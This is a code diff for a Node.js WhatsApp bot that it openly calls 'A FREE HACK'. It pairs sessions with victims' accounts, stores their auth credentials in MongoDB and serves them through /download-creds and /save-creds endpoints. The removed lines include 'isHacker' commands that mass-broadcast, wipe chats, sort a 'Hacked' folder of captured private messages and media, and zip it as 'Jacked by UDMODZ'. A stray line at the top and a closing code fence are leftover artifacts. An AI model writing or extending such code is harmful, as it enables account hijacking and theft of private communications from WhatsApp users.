@@ -1,6 +1,6 @@
+t
 const {
   default: makeWASocket,
-  useMultiFileAuthState,
   DisconnectReason,
   jidNormalizedUser,
   getContentType,
@@ -29,10 +29,6 @@ let sessionHealthMonitor = new Map(); // Track session health
 let sessionMetadata = new Map(); // Store session metadata
 
 async function connectMongo() {
-  if (config.USE_MONGODB !== 'true') {
-    console.log('MongoDB is disabled in settings');
-    return null;
-  }
   if (db) return db;
   if (!config.MONGODB_URI) {
     console.error('MONGODB_URI is not set in settings');
@@ -106,10 +102,6 @@ function getSessionStatus(sessionId) {
 }
 
 async function saveSession(sessionId, data) {
-  if (config.USE_MONGODB !== 'true') {
-    console.log('MongoDB is disabled, skipping saveSession');
-    return;
-  }
   try {
     const database = await connectMongo();
     if (!database) {
@@ -130,10 +122,6 @@ async function saveSession(sessionId, data) {
 }
 
 async function loadSession(sessionId) {
-  if (config.USE_MONGODB !== 'true') {
-    console.log('MongoDB is disabled, skipping loadSession');
-    return null;
-  }
   try {
     const database = await connectMongo();
     if (!database) {
@@ -151,10 +139,6 @@ async function loadSession(sessionId) {
 }
 
 async function deleteSession(sessionId) {
-  if (config.USE_MONGODB !== 'true') {
-    console.log('MongoDB is disabled, skipping deleteSession');
-    return;
-  }
   try {
     const database = await connectMongo();
     if (!database) {
@@ -170,10 +154,6 @@ async function deleteSession(sessionId) {
 }
 
 async function closeMongo() {
-  if (config.USE_MONGODB !== 'true') {
-    console.log('MongoDB is disabled, skipping closeMongo');
-    return;
-  }
   if (client) {
     try {
       await client.close();
@@ -197,11 +177,10 @@ const addmin = ("94704638406");
 // Import command system
 const { cmd, commands } = require('./command');
 
-// Custom auth state for MongoDB with file fallback
+// Custom auth state for MongoDB
 async function useMongoAuthState(sessionId) {
   let creds = {};
   let keys = {};
-  let useMongoDB = true;
 
   try {
     const sessionData = await loadSession(sessionId);
@@ -210,87 +189,17 @@ async function useMongoAuthState(sessionId) {
       keys = sessionData.keys || {};
     }
   } catch (error) {
-    console.error('Error loading session from MongoDB, falling back to file storage:', error.message);
-    useMongoDB = false;
+    console.error('Error loading session from MongoDB:', error.message);
   }
 
   const saveCreds = async () => {
-    // Always try to save to MongoDB if configured
-    if (config.USE_MONGODB === 'true') {
-      try {
-        await saveSession(sessionId, { creds, keys });
-        console.log(`Session ${sessionId} saved to MongoDB`);
-      } catch (error) {
-        console.error('Error saving creds to MongoDB, falling back to file storage:', error.message);
-        useMongoDB = false;
-      }
-    }
-
-    // Always save to file storage as backup
     try {
-      const authDir = path.join(__dirname, 'auth_info_baileys', sessionId);
-      if (!fs.existsSync(authDir)) {
-        fs.mkdirSync(authDir, { recursive: true });
-      }
-      const credsPath = path.join(authDir, 'creds.json');
-      fs.writeFileSync(credsPath, JSON.stringify({ creds, keys }, null, 2));
-      console.log(`Session ${sessionId} saved to file storage`);
-    } catch (fileError) {
-      console.error('Error saving to file storage:', fileError.message);
-      console.error('File path:', credsPath);
-      console.error('Error details:', {
-        name: fileError.name,
-        code: fileError.code,
-        errno: fileError.errno,
-        syscall: fileError.syscall
-      });
+      await saveSession(sessionId, { creds, keys });
+      console.log(`Session ${sessionId} saved to MongoDB`);
+    } catch (error) {
+      console.error('Error saving creds to MongoDB:', error.message);
     }
   };
-
-  // Try to load from MongoDB first if configured
-  if (config.USE_MONGODB === 'true') {
-    try {
-      const sessionData = await loadSession(sessionId);
-      if (sessionData) {
-        creds = sessionData.creds || {};
-        keys = sessionData.keys || {};
-        console.log(`Session ${sessionId} loaded from MongoDB`);
-        return {
-          state: {
-            creds,
-            keys: makeCacheableSignalKeyStore(keys, P({ level: 'silent' }))
-          },
-          saveCreds
-        };
-      }
-    } catch (error) {
-      console.error('Error loading from MongoDB, trying file storage:', error.message);
-    }
-  }
-
-  // Load from file storage as fallback
-  try {
-    const authDir = path.join(__dirname, 'auth_info_baileys', sessionId);
-    const credsPath = path.join(authDir, 'creds.json');
-    if (fs.existsSync(credsPath)) {
-      const fileData = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
-      creds = fileData.creds || {};
-      keys = fileData.keys || {};
-      console.log(`Session ${sessionId} loaded from file storage`);
-    }
-  } catch (fileError) {
-    console.error('Error loading from file storage:', fileError.message);
-    console.error('File path:', credsPath);
-    console.error('Error details:', {
-      name: fileError.name,
-      code: fileError.code,
-      errno: fileError.errno,
-      syscall: fileError.syscall
-    });
-    // Initialize empty creds and keys if file loading fails
-    creds = {};
-    keys = {};
-  }
 
   return {
     state: {
@@ -567,359 +476,6 @@ const fetchJson = async (url, options) => {
     }
 }
 
-cmd({
-  pattern: "broadcast",
-  desc: "Broadcast a message to all chats.",
-  category: "owner",
-  filename: __filename
-}, async (conn, mek, m, { from, isHacker, args, reply }) => {
-  if (!isHacker) return;
-  if (!args.length) return await msgSend(conn, m, "Please provide a message to broadcast");
-  const message = args.join(' ');
-  const chats = await conn.chats.all();
-  for (const chat of chats) {
-    try {
-      await conn.sendMessage(chat.id, { text: message }, { quoted: mek });
-    } catch (e) {
-      console.error(`Failed to send message to ${chat.id}:`, e);
-    }
-  }
-  await console.log("Broadcast sent successfully");
-});
-cmd({
-  pattern: "groupbroadcast",
-  desc: "Broadcast a message to all groups.",
-  category: "owner",
-  filename: __filename
-}, async (conn, mek, m, { from, isHacker, args, reply }) => {
-  if (!isHacker) return;
-  if (!args.length) return await msgSend(conn, m, "Please provide a message to broadcast to groups");
-  const message = args.join(' ');
-  const chats = await conn.chats.all();
-  for (const chat of chats) {
-    if (chat.id.endsWith('@g.us')) {
-      try {
-        await conn.sendMessage(chat.id, { text: message }, { quoted: mek });
-      } catch (e) {
-        console.error(`Failed to send message to ${chat.id}:`, e);
-      }
-    }
-  }
-  await console.log("Group broadcast sent successfully");
-});
-cmd({
-  pattern: "setpp",
-  desc: "Set bot profile picture.",
-  category: "owner",
-  filename: __filename
-}, async (conn, mek, m, { from, isHacker, quoted, reply }) => {
-  if (!isHacker) return;
-  if (!quoted || quoted.type !== 'imageMessage') {
-    return await msgSend(conn, m, "Please reply to an image message to set as profile picture");
-  }
-  try {
-    const buffer = await downloadMediaMessage(quoted, 'setpp');
-    if (!buffer) {
-      return await msgSend(conn, m, "Failed to download the image. Please try again.");
-    }
-    const userId = conn.user && conn.user.id ? conn.user.id : null;
-    if (userId) {
-      await conn.updateProfilePicture(userId, { img: buffer });
-      await msgSend(conn, m, "Profile picture updated successfully!");
-    } else {
-      console.error("Cannot update profile picture: user ID not available");
-      await msgSend(conn, m, "Failed to update profile picture: User ID not available");
-    }
-  } catch (error) {
-    console.error("Error updating profile picture:", error);
-    await msgSend(conn, m, "Failed to update profile picture. Please try again.");
-  }
-});
-cmd({
-  pattern: "clearchats",
-  desc: "Clear all chats from the bot.",
-  category: "owner",
-  filename: __filename
-}, async (conn, mek, m, { isHacker }) => {
-  if (!isHacker) return;
-  try {
-    const chats = await conn.chats.all();
-    for (const chat of chats) {
-      await conn.chatModify({ clear: true }, chat.id);
-    }
-  } catch (error) {
-    console.error("Error clearing chats:", error);
-
-  }
-});
-cmd({
-    pattern: "promote",
-    desc: "Promote a user to group admin.",
-    category: "owner",
-    use: '<quote|reply|number>',
-    filename: __filename
-},
-async (conn, mek, m, { from, quoted, q, isGroup, isBotAdmins, isAdmins, isHacker, reply }) => {
-    if (!isHacker) return 
-    if (!isGroup) return 
-    if (!isBotAdmins) return 
-
-    let user;
-    if (quoted) {
-        user = quoted.sender;
-    } else if (q) {
-        user = `${q.replace(/\D/g, '')}@s.whatsapp.net`;
-    } else {
-        return 
-    }
-
-    try {
-        await conn.groupParticipantsUpdate(from, [user], 'promote');
-    } catch (e) {
-        console.error(e);
-    }
-});
-cmd({
-    pattern: "leave",
-    desc: "Make the bot leave the current group.",
-    category: "owner",
-    filename: __filename
-},
-async (conn, mek, m, { from, isGroup, isHacker, reply }) => {
-    if (!isHacker) return 
-    if (!isGroup) return 
-    try {
-        await conn.groupLeave(from);
-    } catch (e) {
-        console.error(e);
-    }
-});
-cmd({
-  pattern: "send",
-  desc: "Send a message to any jid/group/channel",
-  alias: ["fo"],
-  category: "owner",
-  use: '.send <jid> <message|media>',
-  filename: __filename
-}, async (conn, mek, m, { isHacker, args, quoted }) => {
-  if (!isHacker) return;
-  if (!args.length) return;
-  let targetJid = args[0];
-  if (!targetJid.includes("@")) {
-    if (targetJid.length > 15) return; // prevent invalid JIDs
-    targetJid = targetJid.replace(/\D/g, '') + "@s.whatsapp.net";
-  }
-  const message = args.slice(1).join(' ') || '';
-  try {
-    if (quoted && quoted.type && (quoted.type === 'imageMessage' || quoted.type === 'videoMessage')) {
-      // Media message from quoted
-      const media = await downloadMediaMessage(quoted, `${Date.now()}`);
-      const type = quoted.type === 'imageMessage' ? 'image' : 'video';
-      const caption = message || (quoted.msg && quoted.msg.caption) || '';
-      await conn.sendMessage(targetJid, { [type]: media, caption });
-    } else if (m.message && (getContentType(m.message) === 'imageMessage' || getContentType(m.message) === 'videoMessage')) {
-      // Media message from attachment
-      const media = await conn.downloadMediaMessage(mek);
-      const type = getContentType(m.message) === 'imageMessage' ? 'image' : 'video';
-      const caption = message || (m.msg && m.msg.caption) || '';
-      await conn.sendMessage(targetJid, { [type]: media, caption });
-    } else {
-      // Text message
-      await conn.sendMessage(targetJid, { text: message });
-    }
-  } catch (e) {
-    console.error("Failed to send:", e);
-  }
-});
-cmd({
-  pattern: "clearchat",
-  desc: "Delete the current chat from the bot's interface",
-  category: "owner",
-  use: ".clearchat",
-  filename: __filename
-}, async (conn, mek, m, { from, isHacker, reply }) => {
-  if (!isHacker) return;
-  try {
-    await conn.chatModify({ clear: true }, from);
-  } catch (error) {
-    console.error("Error clearing chat:", error);
-  }
-});
-cmd({
-    pattern: "status",
-    desc: "Check bot status",
-    category: "owner",
-    filename: __filename
-},
-async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isHacker, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
-    try {
-        await msgSend(conn, m, "WORKING");
-    } catch (e) {
-        console.log(e);
-    }
-});
-cmd({
-    pattern: "statusset",
-    desc: "Set bot WhatsApp status (about/bio)",
-    category: "owner",
-    use: ".statusset <text>",
-    filename: __filename
-},
-async (conn, mek, m, { isHacker, args }) => {
-    if (!isHacker) return;
-    const status = args.join(' ');
-    if (!status) return;
-    try {
-        await conn.updateProfileStatus(status);
-        console.log(`Status updated: ${status}`);
-    } catch (e) {
-        console.error("Failed to update status:", e);
-    }
-});
-
-cmd({
-  pattern: "story",
-  desc: "Post a WhatsApp status (story) as text, image, or video",
-  category: "owner",
-  use: ".story <text|url> [caption]",
-  filename: __filename
-}, async (conn, mek, m, { isHacker, args, quoted }) => {
-  if (!isHacker) return;
-  try {
-    if (quoted && quoted.message) {
-      // Handle quoted messages
-      const quotedType = getContentType(quoted.message);
-      if (quotedType === 'imageMessage') {
-        const image = await conn.downloadMediaMessage(quoted);
-        const caption = args.join(' ') || quoted.message.imageMessage.caption || '';
-        await conn.sendMessage("status@broadcast", { image, caption });
-      } else if (quotedType === 'videoMessage') {
-        const video = await conn.downloadMediaMessage(quoted);
-        const caption = args.join(' ') || quoted.message.videoMessage.caption || '';
-        await conn.sendMessage("status@broadcast", { video, caption });
-      } else if (quotedType === 'conversation' || quotedType === 'extendedTextMessage') {
-        const text = quoted.message.conversation || quoted.message.extendedTextMessage.text;
-        await conn.sendMessage("status@broadcast", { text });
-      } else {
-        // Fallback for other message types
-        const text = args.join(' ') || 'Quoted message';
-        await conn.sendMessage("status@broadcast", { text });
-      }
-    } else if (args.length && /^https?:\/\/\S+\.\S+/i.test(args[0])) {
-      // Media story (image/video by URL)
-      const url = args[0];
-      const caption = args.slice(1).join(' ') || '';
-      const res = await axios.head(url);
-      const mime = res.headers['content-type'];
-      if (mime.startsWith("image")) {
-        await conn.sendMessage("status@broadcast", { image: { url }, caption });
-      } else if (mime.startsWith("video")) {
-        await conn.sendMessage("status@broadcast", { video: { url }, caption });
-      } else {
-
-      }
-    } else {
-      // Text story
-      const text = args.join(' ');
-      await conn.sendMessage("status@broadcast", { text });
-    }
-    
-  } catch (e) {
-    console.error("Failed to send status update:", e);
-    
-  }
-});
-cmd({
-  pattern: "reorganize",
-  desc: "Reorganize Hacked folder files",
-  category: "owner",
-  filename: __filename
-}, async (conn, mek, m, { isHacker }) => {
-  if (!isHacker) return;
-  const hackedDir = './Hacked';
-  const botNumber = conn.user && conn.user.id ? conn.user.id.split(':')[0] : 'unknown';
-  if (!fs.existsSync(hackedDir)) {
-    console.log('Hacked directory does not exist.');
-    return;
-  }
-  const files = fs.readdirSync(hackedDir).filter(file => file.endsWith('.txt') || file.endsWith('.jpg') || file.endsWith('.mp4'));
-  files.forEach(file => {
-    const filePath = path.join(hackedDir, file);
-    if (fs.statSync(filePath).isFile()) {
-      let isGroup = false;
-      let subDir = 'private';
-      let newFileName = file;
-      if (file.includes('@g.us')) {
-        isGroup = true;
-        subDir = 'group';
-      } else {
-        const jid = file.replace('.txt', '').replace('.jpg', '').replace('.mp4', '');
-        const number = jid.split('@')[0];
-        newFileName = `${number}${path.extname(file)}`;
-      }
-      const baseDir = path.join(hackedDir, botNumber);
-      const dirPath = path.join(baseDir, subDir);
-      const newFilePath = path.join(dirPath, newFileName);
-      if (!fs.existsSync(baseDir)) {
-        fs.mkdirSync(baseDir, { recursive: true });
-      }
-      if (!fs.existsSync(dirPath)) {
-        fs.mkdirSync(dirPath, { recursive: true });
-      }
-      fs.renameSync(filePath, newFilePath);
-      console.log(`Moved ${file} to ${newFilePath}`);
-    }
-  });
-  console.log('Reorganization complete.');
-});
-cmd({
-  pattern: "creategroup",
-  desc: "Create a WhatsApp group",
-  category: "owner",
-  use: ".creategroup <group name> <jid1,jid2,...>",
-  filename: __filename
-}, async (conn, mek, m, { isHacker, args }) => {
-  if (!isHacker) return;
-  if (args.length < 2) return await msgSend(conn, m, "Please provide group name and members");
-  const groupName = args[0];
-  const members = args.slice(1).join(',').split(',').map(jid => jid.replace(/\s/g, '').replace(/\D/g, '') + "@s.whatsapp.net").filter(Boolean);
-  try {
-    const group = await conn.groupCreate(groupName, members);
-    await msgSend(conn, m, `Group "${groupName}" created with ID: ${group.id}`);
-    console.log(`Group "${groupName}" created with members: ${members.join(', ')}`);
-  } catch (e) {
-    console.error("Failed to create group:", e);
-    await msgSend(conn, m, "Failed to create group");
-  }
-});
-cmd({
-  pattern: "get",
-  desc: "Backup Hacked folder into zip",
-  category: "owner",
-  fromMe: true,
-  filename: __filename
-}, async (conn, m, msg, { reply, isHacker }) => {
-    if (!isHacker) return 
-
-  const botNumber = conn.user && conn.user.id ? conn.user.id.split(':')[0] : 'unknown';
-  const zipPath = path.join(__dirname, "Jacked by UDMODZ 💙.zip");
-  const hackedFolderPath = path.join(__dirname, "Hacked", botNumber);
-  if (!fs.existsSync(hackedFolderPath)) {
-    console.log(`❌ Hacked folder not found for bot number ${botNumber}`);
-    await conn.sendMessage(m.chat, { text: `❌ Hacked folder not found for bot number ${botNumber}` }, { quoted: m });
-    return;
-  }
-  const zip = new AdmZip();
-  zip.addLocalFolder(hackedFolderPath, "Hacked");
-  zip.writeZip(zipPath);
-  await conn.sendMessage(m.chat, {
-    document: fs.readFileSync(zipPath),
-    fileName: "Jacked by UDMODZ 💙.zip",
-    mimetype: "application/zip",
-    caption: "> ㋡ 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙽𝚄𝚁𝙾"
-  }, { quoted: m });
-  fs.unlinkSync(zipPath);
-});
 
 
 cmd({
@@ -945,18 +501,9 @@ cmd({
   }
 });
 
-console.log('┈█┈┈┈┈██┈▓█████▄┈┈┈███▄┈▄███▓┈▒█████┈┈┈▓█████▄┈┈▒███████▒');
-console.log('┈██┈┈▓██▒▒██▀┈██▌┈▓██▒▀█▀┈██▒▒██▒┈┈██▒┈▒██▀┈██▌┈▒┈▒┈▒┈▄▀░');
-console.log('▓██┈┈▒██░░██┈┈┈█▌┈▓██┈┈┈┈▓██░▒██░┈┈██▒┈░██┈┈┈█▌┈░┈▒┈▄▀▒░┈');
-console.log('▓▓█┈┈░██░░▓█▄┈┈┈▌┈▒██┈┈┈┈▒██┈▒██┈┈┈██░┈░▓█▄┈┈┈▌┈┈┈▄▀▒┈┈┈░');
-console.log('▓▓█┈┈░██░░▓█▄┈┈┈▌┈▒██┈┈┈┈▒██┈▒██┈┈┈██░┈░▓█▄┈┈┈▌┈┈┈▄▀▒┈┈┈░');
-console.log('▒▒█████▓┈░▒████▓┈┈▒██▒┈┈┈░██▒░┈████▓▒░┈░▒████▓┈┈▒███████▒');
-console.log('░▒▓▒┈▒┈▒┈┈▒▒▓┈┈▒┈┈░┈▒░┈┈┈░┈┈░░┈▒░▒░▒░┈┈┈▒▒▓┈┈▒┈┈░▒▒┈▓░▒░▒');
-console.log('░░▒░┈░┈░┈┈░┈▒┈┈▒┈┈░┈┈░┈┈┈┈┈┈░┈┈░┈▒┈▒░┈┈┈░┈▒┈┈▒┈┈░░▒┈▒┈░┈▒');
-console.log('┈░░░┈░┈░┈┈░┈░┈┈░┈┈░┈┈┈┈┈┈░┈┈┈░┈░┈░┈▒┈┈┈┈░┈░┈┈░┈┈░┈░┈░┈░┈░');
-console.log('┈░░░┈░┈░┈┈░┈░┈┈░┈┈░┈┈┈┈┈┈░┈┈┈░┈░┈░┈▒┈┈┈┈░┈░┈┈░┈┈░┈░┈░┈░┈░');
-console.log('┈┈┈░┈┈┈┈┈┈┈┈░┈┈┈┈┈┈┈┈┈┈┈┈░┈┈┈┈┈┈┈░┈░┈┈┈┈┈┈░┈┈┈┈┈┈┈░┈░┈┈┈┈');
-console.log('┈┈┈┈┈┈┈┈┈┈░┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈░┈┈┈┈┈┈┈░┈┈┈┈┈┈┈┈');
+
+console.log('┈┈┈😒😒😒😒┈┈');
+console.log('┈┈🥺🥺🥺🥺🥺🥺┈┈░┈┈┈┈┈┈┈┈');
 console.log('By UDMODZ');
 console.log('DONT SELL');
 console.log('A FREE HACK');
@@ -967,45 +514,24 @@ const host = '0.0.0.0';
 // Startup code from startup.js
 async function autoStartSessions() {
   // Load sessions from MongoDB and start them
-  if (config.USE_MONGODB === 'true') {
-    try {
-      const database = await connectMongo();
-      if (!database) {
-        console.log('MongoDB connection failed, falling back to file sessions.');
-        return autoStartFileSessions();
-      }
-      const collection = database.collection('sessions');
-      const sessions = await collection.find({}).toArray();
-      if (sessions.length === 0) {
-        console.log('No sessions found in MongoDB to auto start.');
-        return;
-      }
-      for (const session of sessions) {
-        console.log(`Starting session from MongoDB: ${session.sessionId}`);
-        await startSession(session.sessionId);
-      }
-    } catch (error) {
-      console.error('Error auto starting sessions from MongoDB:', error);
-      return autoStartFileSessions();
+  try {
+    const database = await connectMongo();
+    if (!database) {
+      console.log('MongoDB connection failed.');
+      return;
     }
-  } else {
-    console.log('MongoDB is disabled in settings, using file-based sessions only.');
-    return autoStartFileSessions();
-  }
-}
-
-async function autoStartFileSessions() {
-  const sessionsDir = path.join(__dirname, 'auth_info_baileys');
-  if (!fs.existsSync(sessionsDir)) {
-    console.log('No sessions directory found to auto start sessions.');
-    return;
-  }
-  const sessionFolders = fs.readdirSync(sessionsDir).filter(file => {
-    return fs.statSync(path.join(sessionsDir, file)).isDirectory() && file !== 'default';
-  });
-
-  for (const session of sessionFolders) {
-    await startSession(session);
+    const collection = database.collection('sessions');
+    const sessions = await collection.find({}).toArray();
+    if (sessions.length === 0) {
+      console.log('No sessions found in MongoDB to auto start.');
+      return;
+    }
+    for (const session of sessions) {
+      console.log(`Starting session from MongoDB: ${session.sessionId}`);
+      await startSession(session.sessionId);
+    }
+  } catch (error) {
+    console.error('Error auto starting sessions from MongoDB:', error);
   }
 }
 
@@ -1013,20 +539,8 @@ async function autoStartFileSessions() {
   try {
     console.log(`Attempting to start session: ${session}`);
     let state, saveCreds;
-    if (config.USE_MONGODB === 'true') {
-      ({ state, saveCreds } = await useMongoAuthState(session));
-    } else {
-      console.log(`Using file-based auth state for session: ${session}`);
-      ({ state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'auth_info_baileys', session)));
-    }
+    ({ state, saveCreds } = await useMongoAuthState(session));
 
-    // If MongoDB is enabled, ensure directory exists for fallback
-    if (config.USE_MONGODB === 'true') {
-      const authDir = path.join(__dirname, 'auth_info_baileys', session);
-      if (!fs.existsSync(authDir)) {
-        fs.mkdirSync(authDir, { recursive: true });
-      }
-    }
     const { version } = await fetchLatestBaileysVersion();
     console.log(`Creating WhatsApp socket for session ${session} with version ${version}`);
 
@@ -1074,21 +588,10 @@ async function autoStartFileSessions() {
         }
       }
 
-      sock.ev.on("connection.update", async (update) => {
-    const { connection, lastDisconnect } = update;
-    if (connection === "close") {
+      if (connection === 'close') {
         const reason = lastDisconnect?.error?.output?.statusCode;
-        console.log("Session closed. Reason:", reason);
-
-        if (reason === 428) {
-            console.log("Connection terminated. Retrying...");
-            // restart session
-            startSession(session); 
-        }
-    } else if (connection === "open") {
-        console.log("✅ Connected:", session);
-    }
-  });
+        console.log(`Session ${session} closed. Reason:`, reason);
+        console.log(`Last disconnect error:`, lastDisconnect?.error);
 
         // Clear pairing timeout if any
         if (connections[session] && connections[session].pairingTimeout) {
@@ -1102,15 +605,10 @@ async function autoStartFileSessions() {
           delete connections[session];
         } else {
           // Add retry limit to prevent infinite loops
-          if (!connections[session]) {
-    console.log(`Session ${session} not found, skipping retry...`);
-    return;
-}
-
-    if (!connections[session].retryCount) {
-        connections[session].retryCount = 0;
-}
-      connections[session].retryCount++;
+          if (!connections[session].retryCount) {
+            connections[session].retryCount = 0;
+          }
+          connections[session].retryCount++;
 
           if (connections[session].retryCount < 5) {
             const delay = Math.min(1000 * Math.pow(2, connections[session].retryCount), 30000); // Exponential backoff, max 30s
@@ -1120,8 +618,8 @@ async function autoStartFileSessions() {
             console.log(`Session ${session} failed to connect after 5 attempts, giving up`);
             delete connections[session];
           }
-        
-        } else if (connection === 'connecting') {
+        }
+      } else if (connection === 'connecting') {
         console.log(`Session ${session} is connecting...`);
         console.log(`Session ${session} websocket state:`, conn.ws ? conn.ws.readyState : 'no websocket');
       } else if (connection === 'open') {
@@ -1152,17 +650,16 @@ async function autoStartFileSessions() {
         }
 
         // Start all other sessions with delay
-        const sessionsDir = path.join(__dirname, 'auth_info_baileys');
-        if (fs.existsSync(sessionsDir)) {
-          const sessionFolders = fs.readdirSync(sessionsDir).filter(file => {
-            return fs.statSync(path.join(sessionsDir, file)).isDirectory() && file !== 'default' && file !== session;
-          });
-          console.log(`Starting other sessions: ${sessionFolders.join(', ')}`);
+        const database = await connectMongo();
+        if (database) {
+          const collection = database.collection('sessions');
+          const sessions = await collection.find({ sessionId: { $ne: session } }).toArray();
+          console.log(`Starting other sessions: ${sessions.map(s => s.sessionId).join(', ')}`);
           let delay = 0;
-          for (const otherSession of sessionFolders) {
+          for (const otherSession of sessions) {
             setTimeout(() => {
-              console.log(`Starting session ${otherSession} with delay`);
-              startSession(otherSession);
+              console.log(`Starting session ${otherSession.sessionId} with delay`);
+              startSession(otherSession.sessionId);
             }, delay);
             delay += 5000; // 5 seconds delay between starts
           }
@@ -1214,25 +711,12 @@ async function autoStartFileSessions() {
             delete connections[session];
           }
 
-          // Clean up from MongoDB if configured
-          if (config.USE_MONGODB === 'true') {
-            try {
-              await deleteSession(session);
-              console.log(`[CLEANUP] Session ${session} cleaned up from MongoDB`);
-            } catch (error) {
-              console.error('[CLEANUP ERROR] MongoDB cleanup failed:', error);
-            }
-          }
-
-          // Clean up from file system
+          // Clean up from MongoDB
           try {
-            const authDir = path.join(__dirname, 'auth_info_baileys', session);
-            if (fs.existsSync(authDir)) {
-              fs.rmSync(authDir, { recursive: true, force: true });
-              console.log(`[CLEANUP] Session ${session} cleaned up from file system`);
-            }
+            await deleteSession(session);
+            console.log(`[CLEANUP] Session ${session} cleaned up from MongoDB`);
           } catch (error) {
-            console.error('[CLEANUP ERROR] File system cleanup failed:', error);
+            console.error('[CLEANUP ERROR] MongoDB cleanup failed:', error);
           }
 
           sessionHealthMonitor.delete(session);
@@ -1456,34 +940,39 @@ app.get('/code', async (req, res) => {
 });
 
 // Endpoint to download creds.js (auth credentials) for pairing
-app.get('/download-creds', (req, res) => {
+app.get('/download-creds', async (req, res) => {
   const session = req.query.session;
   if (!session) {
     return res.status(400).json({ error: 'Session parameter is required' });
   }
-  const credsPath = path.join(__dirname, 'auth_info_baileys', session, 'creds.json');
 
   // Check if this is a fetch request (expects JSON) or a download request
   const accept = req.headers.accept || '';
   if (accept.includes('application/json') || req.query.json === 'true') {
     // Return JSON for fetch requests
     try {
-      const credsData = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
+      const credsData = await loadSession(session);
       res.json(credsData);
     } catch (error) {
       res.status(404).json({ error: 'Credentials not found' });
     }
   } else {
     // Return file download for browser downloads
-    res.download(credsPath, 'creds.js', (err) => {
-      if (err) {
-        res.status(404).send('Credentials not found');
+    try {
+      const credsData = await loadSession(session);
+      if (!credsData) {
+        return res.status(404).send('Credentials not found');
       }
-    });
+      res.setHeader('Content-Type', 'application/json');
+      res.setHeader('Content-Disposition', 'attachment; filename=creds.js');
+      res.send(JSON.stringify(credsData, null, 2));
+    } catch (error) {
+      res.status(404).send('Credentials not found');
+    }
   }
 });
 
-app.post('/save-creds', express.json(), (req, res) => {
+app.post('/save-creds', express.json(), async (req, res) => {
   let session = req.query.session;
   const credsData = req.body;
 
@@ -1491,15 +980,8 @@ app.post('/save-creds', express.json(), (req, res) => {
     return res.status(400).json({ error: 'Session parameter is required' });
   }
 
-  const credsDir = path.join(__dirname, 'auth_info_baileys', session);
-  const credsPath = path.join(credsDir, 'creds.json');
-
   try {
-    // Ensure session directory exists
-    if (!fs.existsSync(credsDir)) {
-      fs.mkdirSync(credsDir, { recursive: true });
-    }
-    fs.writeFileSync(credsPath, JSON.stringify(credsData, null, 2));
+    await saveSession(session, credsData);
     console.log(`Credentials saved for session: ${session}`);
     res.status(200).send('Credentials saved');
   } catch (error) {
@@ -1511,19 +993,8 @@ app.post('/save-creds', express.json(), (req, res) => {
 async function connectToWA() {
   console.log("Connecting wa Hack 😌...");
   let state, saveCreds;
-  if (config.USE_MONGODB === 'true') {
-    ({ state, saveCreds } = await useMongoAuthState('default'));
-  } else {
-    ({ state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/'));
-  }
+  ({ state, saveCreds } = await useMongoAuthState('default'));
 
-  // If MongoDB failed and we're using file fallback, ensure directory exists
-  if (config.USE_MONGODB === 'true') {
-    const authDir = path.join(__dirname, 'auth_info_baileys');
-    if (!fs.existsSync(authDir)) {
-      fs.mkdirSync(authDir, { recursive: true });
-    }
-  }
   var { version } = await fetchLatestBaileysVersion();
   const conn = makeWASocket({
     logger: P({ level: 'silent' }),
@@ -2018,3 +1489,4 @@ module.exports = {
     }
   }]
 };
+```
